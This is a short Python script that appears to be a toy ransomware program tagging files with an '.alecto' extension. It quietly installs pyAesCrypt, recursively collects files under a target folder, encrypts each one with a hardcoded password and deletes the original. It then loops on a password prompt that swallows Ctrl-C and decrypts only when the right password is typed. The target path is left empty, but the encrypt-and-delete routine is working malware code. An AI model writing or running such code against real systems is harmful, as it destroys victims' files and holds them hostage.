import subprocess
try:
    import pyAesCrypt as aes
except:
    subprocess.call(["pip","install","pyAesCrypt"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
import os,pathlib,sys,itertools
from pprint import pprint

cycle = itertools.cycle(r"/-\|")

def test_path_get(target,list_data=[]):
    if os.path.isdir(target) == True:
       for path in pathlib.Path(target).glob("*"):
           test_path_get(f"{path}")
    else:
         list_data.append(target)
    return list_data


def encrypt_file(list_data,password):
    try:
        
     for path in list_data:

        sys.stdout.write("\r")
        sys.stdout.write(f"[*] Encrypt -> [{path}] ~ {next(cycle)}")
        sys.stdout.flush()

        aes.encryptFile(path,f"{path}.alecto",password)
        os.remove(path)
    except :
        pass

def decrypt_file(list_data,password):
    try:
      for path in list_data:
        path_name,file_name = os.path.dirname(path),os.path.basename(path).split(".alecto")[0]

        sys.stdout.write("\r")
        sys.stdout.write(f"[*] Decrypt -> [{path_name}/{file_name}] ~ {next(cycle)}")
        sys.stdout.flush()

        aes.decryptFile(path,f"{path_name}/{file_name}",password)
        os.remove(path)
    except:
        pass
    
def test_path_build():

    for path in range(100):
        with open(f"/Test/{path}.txt","w+",encoding="utf-8")as file_build:
            file_build.write("hello")

def main(password="password"):

    target_path = ""
    #test_path_build()
    list_date = test_path_get(target_path)
    encrypt_file(list_date,password)
    while True:
        try:
            if str(input("\nPassword : ")) == password:
               decrypt_file(list_date,password)
               sys.exit()
        except KeyboardInterrupt:
            pass
    
if __name__ == "__main__":

    main()

